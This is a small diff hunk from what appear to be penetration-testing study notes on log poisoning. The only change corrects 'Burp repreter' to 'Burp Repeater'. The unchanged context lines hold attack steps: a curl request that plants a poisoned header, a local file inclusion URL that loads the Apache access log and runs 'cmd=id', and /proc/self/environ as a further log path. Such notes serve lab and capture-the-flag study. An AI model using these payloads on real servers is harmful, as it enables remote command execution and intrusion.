@@ -130,7 +130,7 @@ Log poisoning:
   curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
   http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
   OR
-  use Burp repreter
+  use Burp Repeater
 
   more log dir:
     /proc/self/environ
